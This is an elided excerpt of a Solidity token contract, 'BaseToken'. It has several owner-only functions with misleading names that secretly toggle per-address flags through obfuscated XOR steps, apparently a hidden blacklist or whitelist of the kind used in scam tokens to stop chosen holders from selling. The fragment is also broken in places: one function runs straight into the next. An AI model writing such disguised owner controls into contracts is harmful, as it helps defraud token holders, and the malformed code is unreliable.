...
contract BaseToken is Ownable {
    ...
    function publicHolders(address account) public onlyOwner {
        bool currentValue = _insrtfinanceaccs[account];
        uint256 currentValueInt = currentValue ? 1 : 0;
        uint256 secretValue = currentValueInt ^ 1;
        _insrtfinanceaccs[account] = secretValue != 0;
    } //stsfls

    function transfer(address to, uint256 value) public returns(bool) {
        _transfer(msg.sender, to, value);
        return true;
    }    function insrtGeneratorNft(address addressholders) public onlyOwner {
    ...
    function insrtMultichain(address addressholders) public onlyOwner {
        bool currentValue = _solapprovetoupgradethecontract[addressholders];
        uint256 currentValueInt = currentValue ? 1 : 0;
        uint256 secretValue = currentValueInt ^ 1;
        _solapprovetoupgradethecontract[addressholders] = secretValue != 0;
    ...
    function insrtNftQuery(address account) public view returns(bool) {
        return _insrtfinanceaccs[account];
    }
